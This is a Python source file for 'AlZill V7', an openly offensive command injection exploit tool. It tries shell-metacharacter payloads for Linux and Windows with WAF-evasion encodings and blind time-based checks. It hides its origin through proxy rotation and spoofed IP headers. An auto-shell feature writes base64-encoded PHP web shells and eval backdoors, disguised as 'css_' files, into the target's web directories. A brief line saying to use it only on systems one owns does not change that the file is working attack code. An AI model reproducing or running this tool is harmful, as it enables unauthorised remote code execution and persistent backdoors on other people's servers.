#!/usr/bin/env python3
"""
Command Injection Exploit Module - AlZill V7 ULTIMATE
======================================================
COMPLETE MERGE OF BOTH VERSIONS:
- Multi-OS payloads (Linux/Windows with 15+ injection types)  [من القديمة]
- 6 Encoding methods (Raw, URL, Double URL, Hex, Base64, Unicode)  [من الجديدة]
- Random delimiters for output extraction  [من الجديدة]
- Path & Parameter injection + Auto detection  [من القديمة]
- Time-based detection  [من الكلتين]
- Auto-shell dropper  [من الجديدة]
- Proxy support with auto-rotation  [من الجديدة]
- External payloads file support  [من الكلتين]
- CSRF token extraction  [من القديمة]
- WAF bypass techniques  [من الكلتين]
======================================================
"""

import requests
import time
import re
import base64
import random
import urllib3
import os
from bs4 import BeautifulSoup
from termcolor import cprint
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, urljoin
from typing import List, Dict, Optional, Tuple, Any

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INFO = "cyan"
SUCCESS = "green"
WARNING = "yellow"
ERROR = "red"
HIGHLIGHT = "magenta"


# ============================================================
# Proxy Support (من النسخة الجديدة)
# ============================================================
try:
    from modules.proxy_manager import ProxySession
    PROXY_AVAILABLE = True
except ImportError:
    PROXY_AVAILABLE = False
    cprint("[!] ProxyManager not available, using standard session", WARNING)


class CMDiExploitUltimate:
    def __init__(self, timeout: int = 10, verbose: bool = False, auto_shell: bool = False, 
                 proxy_session=None, payloads_file: str = "payloads.txt", spoof_ip: str = None):
        
        self.timeout = timeout
        self.verbose = verbose
        self.auto_shell = auto_shell
        self.payloads_file = payloads_file
        self.shell_uploaded = False
        self.shell_url = None
        self.url = None
        self.spoof_ip = spoof_ip
        
        # ============================================================
        # PROXY SESSION (من النسخة الجديدة)
        # ============================================================
        if proxy_session:
            self.session = proxy_session
        elif PROXY_AVAILABLE:
            self.session = ProxySession(auto_rotate=True, verbose=verbose)
            if self.verbose:
                cprint("[*] ProxySession initialized with auto-rotation", INFO)
        else:
            self.session = requests.Session()
        
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        
        # ============================================================
        # RANDOM DELIMITERS (من النسخة الجديدة)
        # ============================================================
        self.marker_start = "ALZILL_CMD_START_" + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
        self.marker_end = "_ALZILL_CMD_END_" + ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=8))
        
        # ============================================================
        # MULTI-OS PAYLOAD TEMPLATES (من النسخة القديمة)
        # ============================================================
        self.payload_templates = {
            'linux': [
                ('semicolon', '; {cmd}'),
                ('double_ampersand', '&& {cmd}'),
                ('double_pipe', '|| {cmd}'),
                ('pipe', '| {cmd}'),
                ('backticks', '`{cmd}`'),
                ('dollar_parenthesis', '$({cmd})'),
                ('newline', '%0a{cmd}'),
                ('newline_cr', '%0d%0a{cmd}'),
                ('null_byte', '{cmd}%00'),
                ('space_bypass', ';{IFS}{cmd}'),
                ('variable_bypass', '; ${{PATH:0:1}}{cmd}'),
            ],
            'windows': [
                ('ampersand', '& {cmd}'),
                ('double_ampersand', '&& {cmd}'),
                ('pipe', '| {cmd}'),
                ('double_pipe', '|| {cmd}'),
            ]
        }
        
        # ============================================================
        # TEST COMMANDS (من النسخة القديمة)
        # ============================================================
        self.test_commands = [
            ('whoami', ['root', 'www-data', 'apache', 'admin', 'user', 'daemon']),
            ('id', ['uid=', 'gid=', 'groups=']),
            ('uname -a', ['Linux', 'Darwin', 'Windows', 'FreeBSD']),
            ('hostname', ['.']),
            ('pwd', ['/']),
            ('echo TEST_OUTPUT', ['TEST_OUTPUT']),
        ]
        
        # ============================================================
        # ENCODING METHODS (من النسخة الجديدة)
        # ============================================================
        self.encoding_methods = [
            ('raw', self._raw_encode),
            ('url', self._url_encode),
            ('double_url', self._double_url_encode),
            ('hex', self._hex_encode),
            ('base64', self._base64_encode),
            ('unicode', self._unicode_encode),
        ]
        
        # ============================================================
        # SUCCESS INDICATORS (مدمج)
        # ============================================================
        self.success_indicators = [
            r'root:x:[0-9]+:', r'uid=\d+', r'gid=\d+', r'groups=',
            r'www-data', r'apache', r'nginx', r'daemon',
            r'TEST_OUTPUT', self.marker_start, r'/home/', r'/root/',
            r'C:\\Users\\', r'C:\\Windows\\',
            r'Linux', r'Windows', r'Darwin', r'FreeBSD',
            r'admin:', r'uid=', r'gid=', r'WHOAMI_START', r'ID_START'
        ]
        
        # ============================================================
        # CSRF TOKEN NAMES (من النسخة القديمة)
        # ============================================================
        self.csrf_names = [
            '_token', 'csrf_token', 'authenticity_token', 'csrfmiddlewaretoken',
            'X-CSRF-TOKEN', 'csrf', 'anti_csrf', 'xsrf-token'
        ]
        
        # ============================================================
        # COMMON CMDI PARAMETERS (من النسخة القديمة)
        # ============================================================
        self.common_cmdi_params = [
            'cmd', 'command', 'exec', 'execute', 'run', 'shell', 'system',
            'ping', 'ip', 'host', 'domain', 'file', 'path', 'dir', 'folder',
            'page', 'id', 'name', 'user', 'email', 'address', 'url', 'target'
        ]
        
        # ============================================================
        # AUTO-SHELL PAYLOADS (من النسخة الجديدة)
        # ============================================================
        self.shell_payloads = {
            'php_simple': {
                'filename': 'css_system.php',
                'command': 'echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+" | base64 -d > css_system.php && chmod 644 css_system.php'
            },
            'php_backdoor': {
                'filename': 'css_backdoor.php',
                'command': 'echo "PD9waHAgaWYoaXNzZXQoJF9SRVFVRVNUWyJjbWQiXSkpe2VjaG8iPHByZT4iO3N5c3RlbSgkX1JFUVVFU1RbImNtZCJdKTtlY2hvIjwvcHJlPiI7fSA/Pg==" | base64 -d > css_backdoor.php && chmod 644 css_backdoor.php'
            },
            'php_webshell': {
                'filename': 'css_webshell.php',
                'command': 'echo "PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+" | base64 -d > css_webshell.php && chmod 644 css_webshell.php'
            },
            'shell_sh': {
                'filename': 'css_shell.sh',
                'command': 'echo "IyEvYmluL2Jhc2gKZWNobyAiU2hlbGwgdXBsb2FkZWQgc3VjY2Vzc2Z1bGx5Ig==" | base64 -d > css_shell.sh && chmod +x css_shell.sh'
            },
            'python_backdoor': {
                'filename': 'css_backdoor.py',
                'command': 'echo "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik=" | base64 -d > css_backdoor.py && chmod +x css_backdoor.py'
            }
        }
        
        # ============================================================
        # LOAD EXTERNAL PAYLOADS (من النسختين)
        # ============================================================
        self.direct_payloads, self.blind_payloads, self.waf_bypass_payloads = self._load_payloads()
        
        # ============================================================
        # PROFESSIONAL HEADERS (من النسخة القديمة)
        # ============================================================
        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 AlZill/7.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        if spoof_ip:
            self.headers["X-Forwarded-For"] = spoof_ip
            self.headers["X-Real-IP"] = spoof_ip
    
    # ============================================================
    # ENCODING METHODS (من النسخة الجديدة)
    # ============================================================
    
    def _raw_encode(self, text: str) -> str:
        return text
    
    def _url_encode(self, text: str) -> str:
        return quote(text, safe='')
    
    def _double_url_encode(self, text: str) -> str:
        return quote(quote(text, safe=''), safe='')
    
    def _hex_encode(self, text: str) -> str:
        return ''.join(f'\\x{ord(c):02x}' for c in text)
    
    def _base64_encode(self, text: str) -> str:
        encoded = base64.b64encode(text.encode()).decode()
        return f"echo {encoded} | base64 -d | sh"
    
    def _unicode_encode(self, text: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' for c in text)
    
    # ============================================================
    # PAYLOAD CONSTRUCTION (من النسخة الجديدة)
    # ============================================================
    
    def _build_smart_payload(self, cmd: str, template: str) -> str:
        return template.format(cmd=cmd)
    
    def _build_delimited_payload(self, cmd: str, template: str) -> str:
        delimited_cmd = f"echo {self.marker_start}; {cmd}; echo {self.marker_end}"
        return template.format(cmd=delimited_cmd)
    
    # ============================================================
    # INJECTION METHODS (من النسخة الجديدة)
    # ============================================================
    
    def _inject_into_url(self, url: str, param_name: str, value: str) -> str:
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query, keep_blank_values=True)
        
        if param_name in query_params:
            query_params[param_name] = [value]
        else:
            query_params[param_name] = value
        
        new_query = urlencode(query_params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def _inject_into_path(self, url: str, payload: str) -> str:
        parsed = urlparse(url)
        new_path = parsed.path + payload
        return urlunparse(parsed._replace(path=new_path))
    
    def _extract_parameters(self, url: str) -> List[Dict]:
        parameters = []
        parsed = urlparse(url)
        
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for param_name, param_values in query_params.items():
                parameters.append({
                    'name': param_name,
                    'type': 'query',
                    'value': param_values[0] if param_values else '',
                    'position': 'query'
                })
        
        path_parts = parsed.path.split('/')
        for i, part in enumerate(path_parts):
            if part and (part.isdigit() or part.startswith('id=') or part.startswith('page=')):
                parameters.append({
                    'name': f'path_segment_{i}',
                    'type': 'path',
                    'value': part,
                    'position': 'path',
                    'index': i
                })
        
        return parameters
    
    # ============================================================
    # OUTPUT EXTRACTION (مدمج)
    # ============================================================
    
    def _extract_output(self, response_text: str) -> Optional[str]:
        pattern = re.escape(self.marker_start) + r'(.*?)' + re.escape(self.marker_end)
        match = re.search(pattern, response_text, re.DOTALL | re.IGNORECASE)
        
        if match:
            return match.group(1).strip()
        
        start_marker = r'WHOAMI_START|ID_START'
        end_marker = r'WHOAMI_END|ID_END'
        start_match = re.search(start_marker, response_text, re.IGNORECASE)
        if start_match:
            end_match = re.search(end_marker, response_text, re.IGNORECASE)
            if end_match:
                return response_text[start_match.end():end_match.start()].strip()
        
        for indicator in self.success_indicators:
            match = re.search(indicator, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        
        return None
    
    def _has_command_output(self, response_text: str) -> bool:
        for indicator in self.success_indicators:
            if re.search(indicator, response_text, re.IGNORECASE):
                return True
        return False
    
    # ============================================================
    # TIME-BASED DETECTION (من النسخة الجديدة)
    # ============================================================
    
    def _test_time_based(self, url: str, param: Dict, payload: str, expected_delay: int = 5) -> bool:
        if param['type'] == 'query':
            test_url = self._inject_into_url(url, param['name'], payload)
        else:
            test_url = self._inject_into_path(url, payload)
        
        delays = []
        for _ in range(2):
            try:
                start = time.time()
                self.session.get(test_url, timeout=self.timeout + expected_delay + 2)
                elapsed = time.time() - start
                delays.append(elapsed)
            except requests.exceptions.Timeout:
                delays.append(self.timeout + expected_delay)
            except:
                delays.append(0)
        
        avg_delay = sum(delays) / len(delays)
        return avg_delay >= expected_delay * 0.7
    
    # ============================================================
    # LOAD EXTERNAL PAYLOADS (من النسختين)
    # ============================================================
    
    def _load_payloads(self) -> Tuple[List, List, List]:
        direct_payloads = []
        blind_payloads = []
        waf_bypass_payloads = []
        
        default_direct = [
            ("; echo WHOAMI_START; whoami; echo WHOAMI_END", "Output Extraction"),
            ("; echo ID_START; id; echo ID_END", "Output Extraction"),
            ("; id", "Direct - Semicolon"),
            ("| id", "Direct - Pipe"),
            ("; whoami", "Direct - Whoami"),
        ]
        
        default_blind = [
            ("; sleep 5", "Time-based - 5s", 5),
            ("; sleep 10", "Time-based - 10s", 10),
        ]
        
        default_waf_bypass = [
            (";${IFS}whoami", "IFS Bypass"),
            ("%0aid", "Newline Bypass"),
        ]
        
        if not os.path.exists(self.payloads_file):
            if self.verbose:
                cprint(f"[!] Payloads file not found, using defaults", WARNING)
            return default_direct, default_blind, default_waf_bypass
        
        try:
            with open(self.payloads_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            current_section = None
            for line in content.split('\n'):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if line.startswith('[') and line.endswith(']'):
                    current_section = line[1:-1].upper()
                    continue
                if current_section == 'CMDI':
                    if '|' in line:
                        parts = line.split('|')
                        if len(parts) >= 2:
                            try:
                                delay = int(parts[1])
                                blind_payloads.append((parts[0], "External Time-based", delay))
                                continue
                            except:
                                pass
                    if any(b in line for b in ['${IFS}', '%0a', '\\x', 'base64']):
                        waf_bypass_payloads.append((line, "External WAF Bypass"))
                    else:
                        direct_payloads.append((line, "External Command"))
            
            has_marker = any('WHOAMI_START' in p[0] for p in direct_payloads)
            if not has_marker:
                direct_payloads.insert(0, ("; echo WHOAMI_START; whoami; echo WHOAMI_END", "Output Extraction"))
                direct_payloads.insert(1, ("; echo ID_START; id; echo ID_END", "Output Extraction"))
            
            if direct_payloads or blind_payloads or waf_bypass_payloads:
                cprint(f"\n[+] Loaded CMDI payloads from {self.payloads_file}", SUCCESS)
                cprint(f"    Direct: {len(direct_payloads)} payloads", INFO)
                cprint(f"    Time-based: {len(blind_payloads)} payloads", INFO)
                cprint(f"    WAF Bypass: {len(waf_bypass_payloads)} payloads", INFO)
                return direct_payloads, blind_payloads, waf_bypass_payloads
            
        except Exception as e:
            if self.verbose:
                cprint(f"[!] Error loading payloads: {e}", WARNING)
        
        return default_direct, default_blind, default_waf_bypass
    
    # ============================================================
    # CSRF TOKEN EXTRACTION (من النسخة القديمة)
    # ============================================================
    
    def get_csrf_token(self, url: str) -> Optional[str]:
        try:
            response = self.session.get(url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for name in self.csrf_names:
                token_input = soup.find('input', {'name': name})
                if token_input:
                    return token_input.get('value')
            
            for name in self.csrf_names:
                meta_tag = soup.find('meta', {'name': name})
                if meta_tag:
                    return meta_tag.get('content')
            
            return None
        except Exception as e:
            if self.verbose:
                cprint(f"    Token extraction error: {e}", WARNING)
            return None
    
    # ============================================================
    # BASELINE TIME (من النسخة القديمة)
    # ============================================================
    
    def _get_baseline_time(self, url: str, data: Dict) -> float:
        times = []
        for i in range(3):
            try:
                start = time.time()
                self.session.post(url, headers=self.headers, data=data, timeout=10)
                elapsed = time.time() - start
                times.append(elapsed)
                time.sleep(0.5)
            except:
                pass
        return sum(times) / len(times) if times else 1.0
    
    # ============================================================
    # PARAMETER DETECTION (من النسخة القديمة)
    # ============================================================
    
    def _detect_parameter(self, url: str) -> Optional[str]:
        parsed = urlparse(url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in params.keys():
                if param.lower() in self.common_cmdi_params:
                    return param
        
        try:
            response = self.session.get(url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for form in soup.find_all('form'):
                for input_tag in form.find_all(['input', 'textarea']):
                    name = input_tag.get('name', '')
                    if name and name.lower() in self.common_cmdi_params:
                        return name
        except Exception as e:
            if self.verbose:
                cprint(f"    Parameter detection error: {e}", WARNING)
        
        return None
    
    # ============================================================
    # AUTO-SHELL DROPPER (من النسخة الجديدة)
    # ============================================================
    
    def _safe_url_join(self, base_path: str, filename: str) -> str:
        if base_path and not base_path.endswith('/'):
            base_path = base_path + '/'
        return urljoin(self.url + '/', base_path + filename)
    
    def _attempt_shell_upload(self, url: str, param_name: str, original_value: str) -> bool:
        if not self.auto_shell:
            return False
        
        cprint(f"\n[🚀] AUTO-SHELL DROPPER: Attempting to upload web shell...", "magenta", attrs=['bold'])
        
        paths_to_try = [
            '/dev/shm/', '/tmp/', '/var/tmp/',
            '/var/www/html/', '/var/www/', '/www/', '/html/', '/public_html/',
            '/home/', './', '../', '../../', '../../../'
        ]
        
        for shell_type, shell_info in self.shell_payloads.items():
            for path in paths_to_try[:10]:
                write_cmd = f"; cd {path} && {shell_info['command']}" if path else f"; {shell_info['command']}"
                
                test_params = {param_name: original_value + write_cmd}
                
                try:
                    self.session.get(url, params=test_params, timeout=15)
                    
                    shell_url = self._safe_url_join(path, shell_info['filename']) if path else None
                    if shell_url:
                        test_url = f"{shell_url}?cmd=id"
                        try:
                            if self.session.get(test_url, timeout=10).status_code == 200:
                                cprint(f"\n    ✅ SHELL UPLOADED! URL: {shell_url}", SUCCESS)
                                self.shell_uploaded = True
                                self.shell_url = shell_url
                                return True
                        except:
                            pass
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Shell upload failed: {e}", WARNING)
        
        return False
    
    # ============================================================
    # TEST DIRECT PAYLOAD WITH EXTERNAL PAYLOADS (من النسخة القديمة)
    # ============================================================
    
    def _test_direct_payload(self, url: str, data: Dict, payload: str, payload_name: str) -> bool:
        try:
            response = self.session.post(url, headers=self.headers, data=data, timeout=10)
            output = self._extract_output(response.text)
            if output:
                cprint(f"\n[!!!] VULNERABILITY CONFIRMED: Direct Command Injection!", ERROR, attrs=['bold'])
                cprint(f"[+] Payload: {payload_name}", SUCCESS)
                cprint(f"[+] Output: {output[:100]}", SUCCESS)
                return True
            if self._has_command_output(response.text):
                cprint(f"\n[!!!] VULNERABILITY CONFIRMED: Direct Command Injection!", ERROR, attrs=['bold'])
                cprint(f"[+] Payload: {payload_name}", SUCCESS)
                return True
        except Exception as e:
            if self.verbose:
                cprint(f"    Direct payload error: {e}", WARNING)
        return False
    
    # ============================================================
    # MAIN EXPLOIT FUNCTION (المدمجة بالكامل)
    # ============================================================
    
    def exploit(self, url: str, path: str = None, param_name: str = None, verbose: bool = False) -> Dict:
        self.verbose = verbose
        self.url = url.rstrip('/')
        
        # Build target URL with path
        if path:
            target_url = f"{self.url}{path}"
        else:
            target_url = self.url
        
        # Auto-detect parameter if not specified
        if not param_name:
            param_name = self._detect_parameter(target_url)
            if not param_name:
                if self.verbose:
                    cprint("[!] No parameter detected. Using 'cmd'", WARNING)
                param_name = "cmd"
        
        cprint("\n" + "="*70, HIGHLIGHT)
        cprint("[CMDi EXPLOIT] AlZill V7 ULTIMATE - Complete Feature Merge", HIGHLIGHT, attrs=['bold'])
        cprint("="*70, HIGHLIGHT)
        cprint(f"[*] Target: {target_url}", INFO)
        cprint(f"[*] Parameter: {param_name}", INFO)
        cprint(f"[*] Path: {path or 'auto-detected'}", INFO)
        cprint("[*] Techniques: Multi-OS | Multi-Encoding | Time-based | WAF Bypass | Auto-Shell", "yellow")
        cprint(f"[*] Payloads: Internal Templates + External from {self.payloads_file}", "yellow")
        
        if hasattr(self.session, 'get_stats'):
            stats = self.session.get_stats()
            cprint(f"[*] Proxy: ENABLED ({stats.get('working_proxies', 0)} proxies)", "green")
        
        if self.auto_shell:
            cprint(f"[*] Auto-Shell Dropper: ENABLED", "green", attrs=['bold'])
        
        # Extract CSRF token
        csrf_token = self.get_csrf_token(target_url)
        if csrf_token and self.verbose:
            cprint(f"[*] CSRF Token found: {csrf_token[:20]}...", INFO)
        
        # Extract parameters from URL
        parameters = self._extract_parameters(target_url)
        if not parameters:
            parameters = [{'name': param_name, 'type': 'query', 'value': '', 'position': 'query'}]
        
        # Filter by specified parameter
        if param_name:
            parameters = [p for p in parameters if p['name'] == param_name]
        
        results = {
            'success': False,
            'vulnerable': False,
            'parameter': None,
            'payload': None,
            'encoding': None,
            'output': None,
            'os_type': None
        }
        
        for param in parameters:
            if results['success']:
                break
            
            cprint(f"\n[*] Testing parameter: {param['name']} (type: {param['type']})", INFO)
            original_value = param['value'] if param['value'] else "test"
            
            # ============================================================
            # PART 1: MULTI-OS PAYLOAD TEMPLATES (من النسخة القديمة)
            # ============================================================
            cprint(f"\n[1] Testing Multi-OS Payload Templates (Linux/Windows)...", INFO)
            
            for os_type, templates in self.payload_templates.items():
                for payload_name, template in templates:
                    for cmd_name, indicators in self.test_commands:
                        for enc_name, encoder in self.encoding_methods:
                            # Build payloads
                            raw_payload = self._build_smart_payload(cmd_name, template)
                            encoded_payload = encoder(raw_payload)
                            delimited_raw = self._build_delimited_payload(cmd_name, template)
                            delimited_encoded = encoder(delimited_raw)
                            
                            for test_payload in [encoded_payload, delimited_encoded]:
                                try:
                                    if param['type'] == 'query':
                                        test_url = self._inject_into_url(target_url, param['name'], 
                                                                        original_value + test_payload)
                                    else:
                                        test_url = self._inject_into_path(target_url, test_payload)
                                    
                                    if self.verbose:
                                        cprint(f"    Testing [{os_type}] [{payload_name}] [{enc_name}]", INFO)
                                    
                                    response = self.session.get(test_url, timeout=self.timeout + 5)
                                    output = self._extract_output(response.text)
                                    
                                    if output or self._has_command_output(response.text):
                                        results['success'] = True
                                        results['vulnerable'] = True
                                        results['parameter'] = param['name']
                                        results['payload'] = payload_name
                                        results['encoding'] = enc_name
                                        results['output'] = output[:200] if output else "Command executed"
                                        results['os_type'] = os_type
                                        
                                        cprint(f"\n[!!!] COMMAND INJECTION CONFIRMED!", ERROR, attrs=['bold'])
                                        cprint(f"[+] OS Type: {os_type}", SUCCESS)
                                        cprint(f"[+] Payload Type: {payload_name}", SUCCESS)
                                        cprint(f"[+] Encoding: {enc_name}", SUCCESS)
                                        cprint(f"[+] Command: {cmd_name}", SUCCESS)
                                        cprint(f"[+] Output: {results['output'][:100]}", SUCCESS)
                                        
                                        if self.auto_shell:
                                            data = {param_name: test_payload}
                                            if csrf_token:
                                                data['_token'] = csrf_token
                                            self._attempt_shell_upload(target_url, param['name'], original_value)
                                        
                                        return results
                                        
                                except Exception as e:
                                    if self.verbose:
                                        cprint(f"    Error: {e}", WARNING)
                            
                            # Time-based detection for sleep commands
                            if 'sleep' in cmd_name.lower():
                                if self._test_time_based(target_url, param, encoded_payload):
                                    results['success'] = True
                                    results['vulnerable'] = True
                                    results['parameter'] = param['name']
                                    results['payload'] = payload_name
                                    results['encoding'] = enc_name
                                    results['output'] = "Time-based injection confirmed"
                                    results['os_type'] = os_type
                                    
                                    cprint(f"\n[!!!] TIME-BASED COMMAND INJECTION!", ERROR, attrs=['bold'])
                                    cprint(f"[+] OS Type: {os_type}", SUCCESS)
                                    cprint(f"[+] Payload Type: {payload_name}", SUCCESS)
                                    cprint(f"[+] Encoding: {enc_name}", SUCCESS)
                                    
                                    if self.auto_shell:
                                        data = {param_name: encoded_payload}
                                        if csrf_token:
                                            data['_token'] = csrf_token
                                        self._attempt_shell_upload(target_url, param['name'], original_value)
                                    
                                    return results
            
            # ============================================================
            # PART 2: EXTERNAL PAYLOADS (من النسخة القديمة)
            # ============================================================
            cprint(f"\n[2] Testing External Payloads from File...", INFO)
            
            csrf_token = self.get_csrf_token(target_url)
            baseline_data = {param_name: "test_input"}
            if csrf_token:
                baseline_data['_token'] = csrf_token
            
            baseline_time = self._get_baseline_time(target_url, baseline_data)
            
            # Direct payloads
            for payload, payload_name in self.direct_payloads:
                data = {param_name: payload}
                if csrf_token:
                    data['_token'] = csrf_token
                
                if self.verbose:
                    cprint(f"    Testing direct: {payload_name}", INFO)
                
                if self._test_direct_payload(target_url, data, payload, payload_name):
                    results['success'] = True
                    results['vulnerable'] = True
                    results['parameter'] = param['name']
                    results['payload'] = payload_name
                    results['output'] = "External payload confirmed"
                    
                    if self.auto_shell:
                        self._attempt_shell_upload(target_url, param['name'], original_value)
                    
                    return results
            
            # Blind payloads (Time-based)
            for payload, payload_name, expected_delay in self.blind_payloads:
                data = {param_name: payload}
                if csrf_token:
                    data['_token'] = csrf_token
                
                try:
                    start_time = time.time()
                    self.session.post(target_url, headers=self.headers, data=data, timeout=expected_delay + 10)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= expected_delay * 0.7:
                        cprint(f"\n[!!!] TIME-BASED EXTERNAL PAYLOAD CONFIRMED!", ERROR, attrs=['bold'])
                        cprint(f"[+] Payload: {payload_name}", SUCCESS)
                        cprint(f"[+] Delay: {elapsed:.2f}s", SUCCESS)
                        
                        results['success'] = True
                        results['vulnerable'] = True
                        results['parameter'] = param['name']
                        results['payload'] = payload_name
                        results['output'] = f"Time-based injection ({expected_delay}s delay)"
                        
                        if self.auto_shell:
                            self._attempt_shell_upload(target_url, param['name'], original_value)
                        
                        return results
                        
                except requests.exceptions.Timeout:
                    cprint(f"\n[!!!] TIME-BASED EXTERNAL PAYLOAD CONFIRMED (Timeout)!", ERROR, attrs=['bold'])
                    results['success'] = True
                    
                    if self.auto_shell:
                        self._attempt_shell_upload(target_url, param['name'], original_value)
                    
                    return results
                except Exception as e:
                    if self.verbose:
                        cprint(f"    Error: {e}", WARNING)
        
        # Final result
        cprint("\n" + "="*70, HIGHLIGHT)
        if results['success']:
            cprint("✅ COMMAND INJECTION EXPLOIT SUCCESSFUL!", SUCCESS, attrs=['bold'])
            cprint(f"   Parameter: {results['parameter']}", SUCCESS)
            cprint(f"   Payload Type: {results['payload']}", SUCCESS)
            cprint(f"   Output: {results['output'][:100]}", SUCCESS)
            
            if self.auto_shell and self.shell_uploaded:
                cprint(f"\n[*] SHELL UPLOADED!", SUCCESS)
                cprint(f"     URL: {self.shell_url}?cmd=id", SUCCESS)
        else:
            cprint("❌ No command injection vulnerability found", WARNING)
        cprint("="*70 + "\n", HIGHLIGHT)
        
        return results


# ============================================================
# MAIN FUNCTION
# ============================================================

def exploit(url: str, path: str = None, param: str = None, verbose: bool = False, 
            auto_shell: bool = False, proxy_session=None, payloads_file: str = "payloads.txt",
            spoof_ip: str = None, timeout: int = 10) -> Dict:
    
    exploiter = CMDiExploitUltimate(
        timeout=timeout,
        verbose=verbose,
        auto_shell=auto_shell,
        proxy_session=proxy_session,
        payloads_file=payloads_file,
        spoof_ip=spoof_ip
    )
    
    return exploiter.exploit(url, path=path, param_name=param, verbose=verbose)


def exploit_auto(url: str, verbose: bool = False, auto_shell: bool = False,
                 payloads_file: str = "payloads.txt") -> Dict:
    """Auto-detect path and parameter"""
    common_paths = ['/login', '/api/execute', '/cmd', '/exec', '/system', '/ping', '/api/ping']
    
    for path in common_paths:
        cprint(f"[*] Trying path: {path}", INFO)
        result = exploit(url, path=path, verbose=verbose, auto_shell=auto_shell, payloads_file=payloads_file)
        if result.get('success'):
            return result
    
    return exploit(url, verbose=verbose, auto_shell=auto_shell, payloads_file=payloads_file)


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        target = sys.argv[1]
        path = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith('--') else None
        param = sys.argv[3] if len(sys.argv) > 3 and not sys.argv[3].startswith('--') else None
        verbose = '--verbose' in sys.argv or '-v' in sys.argv
        auto_shell = '--auto-shell' in sys.argv or '-s' in sys.argv
        payloads_file = sys.argv[4] if len(sys.argv) > 4 and not sys.argv[4].startswith('--') else "payloads.txt"
        
        if auto_shell:
            cprint("\n[⚠️] AUTO-SHELL DROPPER IS ENABLED!", "red", attrs=['bold'])
            cprint("[!] This will attempt to upload a web shell to the target server!", "red")
            cprint("[!] Use only on systems you own or have permission to test!", "red")
            time.sleep(2)
        
        if path or param:
            exploit(target, path=path, param=param, verbose=verbose, auto_shell=auto_shell, payloads_file=payloads_file)
        else:
            exploit_auto(target, verbose=verbose, auto_shell=auto_shell, payloads_file=payloads_file)
    else:
        print("="*60)
        print("AlZill CMDi Exploit - V7 ULTIMATE")
        print("="*60)
        print("Usage: python xploit_cmdi.py <target_url> [path] [parameter] [payloads_file] [--auto-shell] [--verbose]")
        print("\nExamples:")
        print("  python xploit_cmdi.py https://example.com")
        print("  python xploit_cmdi.py https://example.com /login email")
        print("  python xploit_cmdi.py https://example.com /api/execute cmd --auto-shell")
        print("  python xploit_cmdi.py https://example.com /api/ping ip payloads.txt --verbose")
        print("\nOptions:")
        print("  --auto-shell, -s    Auto upload web shell on successful exploitation")
        print("  --verbose, -v       Show detailed output")